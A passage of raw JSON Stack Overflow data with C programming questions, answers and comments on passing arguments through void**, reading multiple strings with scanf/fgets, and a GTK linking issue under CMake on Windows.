"https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "edited": false, "score": 0, "creation_date": 1499198590, "post_id": 44912786, "comment_id": 76803057, "body": "The function is basically a wrapper around <a href=\"http://www.mono-project.com/docs/advanced/embedding/#invoking-a-method\" rel=\"nofollow noreferrer\">mono_runtime_invoke</a>, so that&#39;s why it&#39;s using <code>void**</code>"}], "answers": [{"comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1499195877, "post_id": 44912836, "comment_id": 76801977, "body": "can you explain?"}, {"owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "edited": false, "score": 1, "creation_date": 1499195908, "post_id": 44912836, "comment_id": 76801990, "body": "Is there a way to achieve that from the outside? I&#39;m not really able to modify that function"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1499196083, "post_id": 44912836, "comment_id": 76802061, "body": "You kind of <i>must</i> to. Otherwise you are casting <code>void **</code> to <code>double*</code>, which are incompatible."}, {"owner": {"reputation": 79096, "user_id": 865874, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ACMnN.png?s=128&g=1", "display_name": "rodrigo", "link": "https://stackoverflow.com/users/865874/rodrigo"}, "edited": false, "score": 0, "creation_date": 1499196420, "post_id": 44912836, "comment_id": 76802181, "body": "If you cannot change <code>doStuff()</code> then you must past a <code>double*</code> cast to a <code>void**</code>, so that the code in there is well defined. That is: <code>double args[2]; doStuff((void**)args);</code>."}, {"owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "edited": false, "score": 0, "creation_date": 1499196555, "post_id": 44912836, "comment_id": 76802233, "body": "<a href=\"http://coliru.stacked-crooked.com/a/44b135d3f01d59fe\" rel=\"nofollow noreferrer\">Seems like it does not work</a>. Maybe it&#39;s because it&#39;s ANSI-C"}, {"owner": {"reputation": 2088, "user_id": 1535706, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/fdbc5a75b701551a48a172a534c74e92?s=128&d=identicon&r=PG", "display_name": "rslemos", "link": "https://stackoverflow.com/users/1535706/rslemos"}, "reply_to_user": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "edited": false, "score": 1, "creation_date": 1499196669, "post_id": 44912836, "comment_id": 76802268, "body": "@Bl4ckb0ne you forgot to change the lines <code>args[0] = &amp;ptr-&gt;d1; args[1] = &amp;ptr-&gt;d2;</code> to <code>args[0] = ptr-&gt;d1; args[1] = ptr-&gt;d2;</code> (not that the reference operator is gone)."}, {"owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "edited": false, "score": 0, "creation_date": 1499196903, "post_id": 44912836, "comment_id": 76802365, "body": "Oops, my bad. It works on my coliru example but it fails on my local code, I&#39;ll inverstigate that later on. Thanks for your answer!"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 79096, "user_id": 865874, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ACMnN.png?s=128&g=1", "display_name": "rodrigo", "link": "https://stackoverflow.com/users/865874/rodrigo"}, "edited": false, "score": 2, "creation_date": 1499198479, "post_id": 44912836, "comment_id": 76803013, "body": "@rodrigo I don&#39;t think casting incompatible pointer types is well defined. They can even have different size on some exotic systems. The function is just broken according to standard C."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1499199296, "post_id": 44912836, "comment_id": 76803329, "body": "It is as in the C pointers are addresses. No garbage collections, no anything."}], "tags": [], "owner": {"reputation": 2088, "user_id": 1535706, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/fdbc5a75b701551a48a172a534c74e92?s=128&d=identicon&r=PG", "display_name": "rslemos", "link": "https://stackoverflow.com/users/1535706/rslemos"}, "is_accepted": true, "score": 1, "last_activity_date": 1499196240, "last_edit_date": 1499196240, "creation_date": 1499195802, "answer_id": 44912836, "question_id": 44912786, "link": "https://stackoverflow.com/questions/44912786/passing-argument-by-void-to-function/44912836#44912836", "title": "Passing argument by void** to function", "body": "<p>You should change your code to:</p>\n\n<pre><code>double doStuff(void ** args)\n{\n    double ** a = (double**)args;\n\n    printf(\"a[0] = %lf\\n\", *a[0]);\n    printf(\"a[1] = %lf\\n\", *a[1]);\n\n    double r = *a[0] + *a[1];\n    return r;\n}\n</code></pre>\n\n<p><strong>EDIT</strong></p>\n\n<p>The OP asked for a change in <code>main</code> instead of <code>doStuff</code> (which s/he does not own).</p>\n\n<p>Now, as noted by @Eugene Sh, the function <code>doStuff</code> is crippled because it asks for a double pointer argument, but uses as a pointer to double.</p>\n\n<p>The change in main is just pass around a pointer to double, but cast to <code>void**</code> just to make the compiler happy:</p>\n\n<pre><code>int main(void) {\n\n    S s;\n    s.d1 = 10.0;\n    s.d2 = 10.0;\n\n    S* ptr = &amp;s;\n\n    double args[2];     // our pointer to double\n    args[0] = ptr-&gt;d1;\n    args[1] = ptr-&gt;d2;\n\n    double d = doStuff((void**)args); // cast to void**\n\n    printf(\"d = %lf\\n\", d);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 843, "favorite_count": 0, "accepted_answer_id": 44912836, "answer_count": 1, "score": 0, "last_activity_date": 1499198008, "creation_date": 1499195579, "last_edit_date": 1499198008, "question_id": 44912786, "link": "https://stackoverflow.com/questions/44912786/passing-argument-by-void-to-function", "title": "Passing argument by void** to function", "body": "<p>I'm trying to pass arguments by a function using a <code>void *</code> to give any type of arguments. But for some reasons I don't understand, no data can be read inside of the function.</p>\n\n<p>This is a reproduced behaviour of a company function. \n<a href=\"http://coliru.stacked-crooked.com/a/fa0093f02eafd268\" rel=\"nofollow noreferrer\">Live on Coliru</a></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\ntypedef struct\n{\n    double d1, d2;\n} S;\n\ndouble doStuff(void ** args)\n{\n    double * a = (double*)args;\n\n    printf(\"a[0] = %lf\\n\", a[0]);\n    printf(\"a[1] = %lf\\n\", a[1]);\n\n    double r = a[0] + a[1];\n    return r;\n}\n\nint main(void) {\n\n    S s;\n    s.d1 = 10.0;\n    s.d2 = 10.0;\n\n    S* ptr = &amp;s;\n\n    void* args[2];\n    args[0] = &amp;ptr-&gt;d1;\n    args[1] = &amp;ptr-&gt;d2;\n\n    double d = doStuff(args);\n\n    printf(\"d = %lf\\n\", d);\n\n    return 0;\n}\n</code></pre>\n\n<p>And it's output</p>\n\n<pre><code>a[0] = 0.000000\na[1] = 0.000000\nd = 0.000000\n</code></pre>\n"}, {"tags": ["c", "string", "char", "scanf"], "comments": [{"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 2, "creation_date": 1499191155, "post_id": 44911782, "comment_id": 76800035, "body": "Try <code>&quot;%[^\\n]s&quot;</code> --&gt; <code>&quot;%99[^\\n]%*c&quot;</code>"}, {"owner": {"reputation": 83, "user_id": 8104381, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh6.googleusercontent.com/-gD-zNb_udzM/AAAAAAAAAAI/AAAAAAAAAHo/Bi5GwzomIno/photo.jpg?sz=128", "display_name": "Ravi Rishie", "link": "https://stackoverflow.com/users/8104381/ravi-rishie"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1499191506, "post_id": 44911782, "comment_id": 76800177, "body": "@BLUEPIXY can u explain me what this means?! and yes ..the coding is working now!"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1499191569, "post_id": 44911782, "comment_id": 76800197, "body": "Note that <code>%[\u2026]</code> is a scan set, a complete conversion specification.  The trailing <code>s</code> would only match a literal <code>s</code>, but since the next character is a newline, the match will fail, but you&#39;ll never know that.  The scan sets (and <code>%c</code> and <code>%n</code> \u2014 and only these three conversion specifiers) do not skip leading white space.  Add a blank to the start (not the end) of your code.  Or use <code>fgets()</code> to read lines \u2014 that&#39;s probably better."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1499191624, "post_id": 44911782, "comment_id": 76800215, "body": "1) <code>s</code> is superfluous. 2) It is necessary to consume the remaining newlines."}, {"owner": {"reputation": 83, "user_id": 8104381, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh6.googleusercontent.com/-gD-zNb_udzM/AAAAAAAAAAI/AAAAAAAAAHo/Bi5GwzomIno/photo.jpg?sz=128", "display_name": "Ravi Rishie", "link": "https://stackoverflow.com/users/8104381/ravi-rishie"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499192719, "post_id": 44911782, "comment_id": 76800667, "body": "@JonathanLeffler <code>fgets()</code> is an option. But since this is from the fundamental part of the book and library functions are not mentioned well yet, I wanted to know the other possibilities. <i>Add a blank to the start (not the end) of your code</i> What do u mean by this?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499192867, "post_id": 44911782, "comment_id": 76800729, "body": "Sorry: &#39;start (not the end) of your code&#39; is horribly sloppily written.  I meant &#39;format string&#39; rather than &#39;code&#39;. That is, consider using <code>&quot; %99[^\\n]&quot;</code> and do not consider using <code>&quot;%99[\\n] &quot;</code>.  See <a href=\"http://stackoverflow.com/questions/19499060/what-is-difference-between-scanfd-and-scanfd\">Trailing blank in <code>scanf()</code> format wreaks havoc</a>."}, {"owner": {"reputation": 20358, "user_id": 216190, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/5a13963fd8a6734ffd1aed8fc76e58ec?s=128&d=identicon&r=PG", "display_name": "Kraken", "link": "https://stackoverflow.com/users/216190/kraken"}, "edited": false, "score": 0, "creation_date": 1499192976, "post_id": 44911782, "comment_id": 76800793, "body": "Why do you think gets wont work here? As i understand gets(str) will prompt user to enter string and that will be stored in str where str is a char[]."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 20358, "user_id": 216190, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/5a13963fd8a6734ffd1aed8fc76e58ec?s=128&d=identicon&r=PG", "display_name": "Kraken", "link": "https://stackoverflow.com/users/216190/kraken"}, "edited": false, "score": 0, "creation_date": 1499193309, "post_id": 44911782, "comment_id": 76800932, "body": "@Kraken: See <a href=\"http://stackoverflow.com/questions/1694036/\">Why <code>gets()</code> is so dangerous that it should never, ever be used?</a>"}, {"owner": {"reputation": 83, "user_id": 8104381, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh6.googleusercontent.com/-gD-zNb_udzM/AAAAAAAAAAI/AAAAAAAAAHo/Bi5GwzomIno/photo.jpg?sz=128", "display_name": "Ravi Rishie", "link": "https://stackoverflow.com/users/8104381/ravi-rishie"}, "reply_to_user": {"reputation": 20358, "user_id": 216190, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/5a13963fd8a6734ffd1aed8fc76e58ec?s=128&d=identicon&r=PG", "display_name": "Kraken", "link": "https://stackoverflow.com/users/216190/kraken"}, "edited": false, "score": 1, "creation_date": 1499193321, "post_id": 44911782, "comment_id": 76800934, "body": "@Kraken I believe <code>gets()</code> has been removed from the stdio.h as a std library function because of situations causing buffer overflow and are suggested to us <code>fgets()</code>. These days you get a message saying : <i>implicit declaration of function \u2018gets\u2019  warning: the `gets&#39; function is dangerous and should not be used</i>"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1499193433, "post_id": 44911782, "comment_id": 76800978, "body": "If only the fundamentals have been taught, then using <code>scanf()</code> with scan sets is unlikely to have been taught; it isn&#39;t part of the basics of <code>scanf()</code>.  Using <code>fgets()</code> is relatively straight-forward.  And the results are generally a lot more predictable than using <code>scanf()</code> et al."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499296590, "post_id": 44911782, "comment_id": 76851204, "body": "regarding lines like: <code>scanf(&quot;%[^\\n]s&quot;,s1);</code>.  There are several problems. 1) always check the returned value (not the parameter values) to assure the operation was successful.  In this case, if the returned value is not 1 then some error occurred.  2) the &#39;s&#39; requires that the incoming data contains a &#39;s&#39; at the end of the line, BUT the input/format specifier &#39;%[^\\n]&#39;  has left the newline in the input buffer, so no &#39;s&#39; will be found. Suggest: remove that trailing &#39;s&#39; 3)  always include a MAX CHARACTERS modifier that is one less than the length of the input buffer, to avoid a buffer overflow."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499296797, "post_id": 44911782, "comment_id": 76851258, "body": "(cont) the code should look similar to: <code>if( 1!= scanf( &quot;%99[^\\n]&quot;, s1 ) ) { fprintf( stderr, &quot;scanf failed to input the string for &#39;s1&#39;&quot; );  exit( EXIT_FAILURE ); }</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499297043, "post_id": 44911782, "comment_id": 76851332, "body": "regarding: <code>char ch[1]; ...  scanf(&quot;%s&quot;,ch); the input format specifiers: &#39;%s&#39; and &#39;^[..]&#39; always append a NUL byte to the input.  so the array &#39;ch[]&#39; is not big enough for even a single char.  Suggest using: </code>char ch[1]; ...   scanf(&quot;%c&quot;, &amp;ch[0]);`"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499297212, "post_id": 44911782, "comment_id": 76851371, "body": "for ease of understanding and readability: 1) follow the axiom: <i>only one statement per line and (at most) one variable declaration per statement.</i>  2) separate code blocks (for, if, else, while, do...while, switch, case, default) via a single blank line."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499297608, "post_id": 44911782, "comment_id": 76851468, "body": "regarding this kind of statement: <code>printf(&quot;yes&quot;);</code>   <code>stdout</code> is buffered and will not be displayed on the terminal until one of four things occurs 1) the buffer overflows 2) a newline sequence is output 2) this call is made: <code>fflush( stdout );</code> 4) the program exits.  In the current scenario, the string: &quot;yes&quot; and the string &quot;no&quot; should both be terminated with a <code>\\n</code> (newline) character.   Also, since no formatting is being performed, an even better statement would be: <code>puts( &quot;yes&quot; );</code>  as that will automatically add a newline sequence."}], "answers": [{"tags": [], "owner": {"reputation": 21, "user_id": 3019166, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/428cb53ee3aa4390481d98512826673a?s=128&d=identicon&r=PG&f=1", "display_name": "Claysmile", "link": "https://stackoverflow.com/users/3019166/claysmile"}, "is_accepted": false, "score": 0, "last_activity_date": 1499191710, "creation_date": 1499191710, "answer_id": 44911956, "question_id": 44911782, "link": "https://stackoverflow.com/questions/44911782/getting-multiple-strings-as-inputs/44911956#44911956", "title": "Getting multiple strings as inputs", "body": "<p>Try fgets.</p>\n\n<pre><code>fgets(s1,100,stdin);\nfgets(s2,100,stdin);\nfgets(s3,100,stdin);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1499197290, "post_id": 44913000, "comment_id": 76802528, "body": "If the user inputs a string bigger than 100 chars, it will assign it to next fgets and things will mess up"}], "tags": [], "owner": {"reputation": 49, "user_id": 8169677, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/8c4a9eefb35f4d7cbabe0c223074f666?s=128&d=identicon&r=PG&f=1", "display_name": "Win Key", "link": "https://stackoverflow.com/users/8169677/win-key"}, "is_accepted": false, "score": 0, "last_activity_date": 1499196556, "creation_date": 1499196556, "answer_id": 44913000, "question_id": 44911782, "link": "https://stackoverflow.com/questions/44911782/getting-multiple-strings-as-inputs/44913000#44913000", "title": "Getting multiple strings as inputs", "body": "<blockquote>\n<pre><code>#include &lt;stdio.h&gt;\nint main(){\nchar s1[100],s2[100],s3[100];\nchar ch[1];\n\nfgets(s1,100,stdin);// like gets but limited by length\nfgets(s2,100,stdin);\nfgets(s3,100,stdin);\n\nscanf(\"%s\",ch);\n\nif( (s1[0]&gt;='a' &amp;&amp; s1[0]&lt;='z') || (s1[0]&gt;='A' &amp;&amp; s1[0]&lt;='Z') ){//ch-alpha?\n    if(s1[0] == ch[0]){  printf(\"yes\"); }//s1[0] == ch[0] ??\n    else{ printf(\"no\"); }\n    }\nelse\n    printf(\"no\"); return 0; }\n</code></pre>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "is_accepted": false, "score": 1, "last_activity_date": 1499204350, "creation_date": 1499204350, "answer_id": 44914293, "question_id": 44911782, "link": "https://stackoverflow.com/questions/44911782/getting-multiple-strings-as-inputs/44914293#44914293", "title": "Getting multiple strings as inputs", "body": "<p>Now before getting to the specified problem lets see what the actual problem is:</p>\n\n<ul>\n<li><p>Problem with scanf()</p>\n\n<p>The problem with scanf() is that it is really bad at managing overflows. And in case of chars or char sequences the newline character is read on the press of enter key in the subsequent scanning. There are numerous instances on SO that concern this problem. <a href=\"https://stackoverflow.com/questions/5240789/scanf-leaves-the-new-line-char-in-buffer\">scanf() leaves the new line char in buffer?</a> and <a href=\"https://stackoverflow.com/questions/20139415/problems-with-scanf\">Problems with scanf</a></p></li>\n<li><p>Problem with gets()</p>\n\n<p>The biggest drawback is that here you need to know the size of input before-hand. If you know your input extremely well, you may use it (Still I won't recommend). <a href=\"https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used\">Why is the gets function so dangerous that it should not be used?</a></p></li>\n<li><p>Problem with fgets()</p>\n\n<p>There are two really common problems with fgets()</p>\n\n<p>The syntax of fgets() is:  </p>\n\n<pre><code>      char *fgets(char *restrict s, int n, FILE *restrict stream);`\n</code></pre>\n\n<p>and generally used like</p>\n\n<pre><code>      fgets(char_array,100,stdin)\n</code></pre>\n\n<ol>\n<li><p>First problem arises when the input is bigger than the integer n provided in the fgets() second parameter. When the input in the buffer is bigger than n it will strip off 1st n chars and allocate it the char pointer which might be a char array. But what about remaining chars? They still are there in the input buffer and will be allocated to next fgets(). Messing things up.</p></li>\n<li><p>Second problem is that every time a new line feed is allocated to the end of char sequence when the input is smaller than the int n-1. </p></li>\n</ol></li>\n</ul>\n\n<p>But if we think for a while the problems with fgets() can be tackled with a simple trick.</p>\n\n<ul>\n<li>Just check for the last character in the char sequence which has been recently allocated. If it is new line, replace it by <em>NULL</em>. Else we know that the input was more than that <strong>int</strong> provided inside fgets(). So all we have to do is eat up the remaining chars in the input buffer. </li>\n</ul>\n\n<p>Here is an example:</p>\n\n<pre><code>   char str1[5];\n   char str2[5];\n   fgets(str1,5,stdin);\n\n   if(strlen(str1)&gt;0){//to avoid Undefined Behavior in case of null byte input\n\n       if(str1[strlen(str1)-1]=='\\n'){\n\n           str1[strlen(str1)-1]='\\0';\n       }\n       else{\n\n           while((getchar())!='\\n');//eating the remaing chars in the buffer\n       } \n   }\n\n   fgets(str2,5,stdin);\n\n\n   if(strlen(str2)&gt;0){\n\n      if(str2[strlen(str2)-1]=='\\n'){\n\n         str2[strlen(str2)-1]='\\0';\n\n      }\n      else{\n\n         while((getchar())!='\\n');\n      }\n\n   }\n   printf(\"\\n1.%s\\n2.%s\",str1,str2);\n</code></pre>\n\n<p>You could even convert strings you got using fgets to float and integers using things like strol or sscanf, but <strong>beware</strong> they may not show independent behavior.</p>\n\n<p>Now coming back to the solution to your problem:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(){\n    char s1[100],s2[100],s3[100];\n    char ch[2];//make ch atleast 2 char wide\n\n    fgets(s1,100,stdin);\n     if(strlen(s1)&gt;0){\n\n          if(s1[strlen(s1)-1]=='\\n'){\n\n             s1[strlen(s1)-1]='\\0';\n\n          }\n          else{\n\n             while((getchar())!='\\n');\n          }\n\n    }\n\n   fgets(s2,100,stdin);\n     if(strlen(s2)&gt;0){\n\n          if(s2[strlen(s2)-1]=='\\n'){\n\n             s2[strlen(s2)-1]='\\0';\n\n          }\n          else{\n\n             while((getchar())!='\\n');\n          }\n\n    }\n\n   fgets(s3,100,stdin);\n     if(strlen(s3)&gt;0){\n\n          if(s3[strlen(s3)-1]=='\\n'){\n\n             s3[strlen(s3)-1]='\\0';\n\n          }\n          else{\n\n             while((getchar())!='\\n');\n          }\n\n    }    \n\n    fgets(ch,2,stdin);\n      if(strlen(ch)&gt;0){\n\n          if(ch[strlen(ch)-1]=='\\n'){\n\n              ch[strlen(ch)-1]='\\0';\n\n          }\n          else{\n\n              while((getchar())!='\\n');\n          }\n\n     }\n\n    if(isalpha(ch[0]) &amp;&amp; (s1[0]==ch[0] || s2[0]==ch[0] || s3[0]==ch[0]))\n        printf(\"yes\");\n    else\n        printf(\"no\");\n\n        return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 83, "user_id": 8104381, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh6.googleusercontent.com/-gD-zNb_udzM/AAAAAAAAAAI/AAAAAAAAAHo/Bi5GwzomIno/photo.jpg?sz=128", "display_name": "Ravi Rishie", "link": "https://stackoverflow.com/users/8104381/ravi-rishie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1626, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1499204350, "creation_date": 1499190857, "last_edit_date": 1499191282, "question_id": 44911782, "link": "https://stackoverflow.com/questions/44911782/getting-multiple-strings-as-inputs", "title": "Getting multiple strings as inputs", "body": "<p>The Question is to take three names as input and check whether the 4th input is the first letter of one of those three names. \n*It needs to be only of alpha type and no other.</p>\n\n<p><strong>Sample Input:</strong></p>\n\n<pre><code>@ON SNOW\nARYA STARK\nHODOR\n@ \n</code></pre>\n\n<p><strong>Output:</strong></p>\n\n<pre><code>NO\n</code></pre>\n\n<p><strong>My code:</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;ctype.h&gt;\nint main(){\n    char s1[100],s2[100],s3[100];\n    char ch[1];\n    scanf(\"%[^\\n]s\",s1);\n    scanf(\"%[^\\n]s\",s2);\n    scanf(\"%[^\\n]s\",s3);\n    scanf(\"%s\",ch);\n    if(isalpha(ch[0]) &amp;&amp; (s1[0]==ch[0] || s2[0]==ch[0] || s3[0]==ch[0]))\n        printf(\"yes\");\n    else\n        printf(\"no\");\n}\n</code></pre>\n\n<p>As I figured out that <code>gets()</code> no longer works, I tried <code>scanf(\"%s\",s1);</code>.\nBut since it does not store the calude after the whitespace <code>\" \"</code>, I tried this <code>scanf(\"%[^\\n]s\",s1);</code>. But the scanning stops at the first name itself.</p>\n\n<pre><code>John Player\nNO\n</code></pre>\n\n<p>What is the way to store multiple strings in a char array without using loops and only using branching??</p>\n"}, {"tags": ["c", "cmake"], "comments": [{"owner": {"reputation": 530, "user_id": 4024569, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/2cd6926eca618981f80bac1aee811788?s=128&d=identicon&r=PG&f=1", "display_name": "sig_seg_v", "link": "https://stackoverflow.com/users/4024569/sig-seg-v"}, "edited": false, "score": 0, "creation_date": 1499187693, "post_id": 44911016, "comment_id": 76798706, "body": "I won&#39;t post an answer as I haven&#39;t used windows in years, but it looks like dwmapi.dll is a windows system binary. My guess is that you should make sure that file is in your build path."}, {"owner": {"reputation": 6973, "user_id": 720391, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lGHly.png?s=128&g=1", "display_name": "mattn", "link": "https://stackoverflow.com/users/720391/mattn"}, "edited": false, "score": 0, "creation_date": 1499188029, "post_id": 44911016, "comment_id": 76798832, "body": "What output with <code>pkg-config --libs gtk+-3.0</code> ?"}, {"owner": {"reputation": 606, "user_id": 7631858, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/29fb7cebb25d089c88c393d5daaf2323?s=128&d=identicon&r=PG&f=1", "display_name": "Nightloewe", "link": "https://stackoverflow.com/users/7631858/nightloewe"}, "edited": false, "score": 0, "creation_date": 1499188373, "post_id": 44911016, "comment_id": 76798973, "body": "C:\\msys64\\mingw64\\bin&gt;pkg-config.exe --libs gtk+-3.0 -LC:/msys64/mingw64/lib -lgtk-3 -lgdk-3 -lgdi32 -limm32 -lshell32 -lole32 -Wl,-luuid -lwinmm -ldwmapi -lsetupapi -lcfgmgr32 -lz -lpangowin32-1.0 -lpangocairo-1.0 -lpango-1.0 -latk-1.0 -lcairo-gobject -lcairo -lgdk_pixbuf-2.0 -lgio-2.0 -lgobject-2.0 -lglib-2.0 -lintl"}], "answers": [{"comments": [{"owner": {"reputation": 606, "user_id": 7631858, "user_type": "registered", "accept_rate": 62, "profile_image": 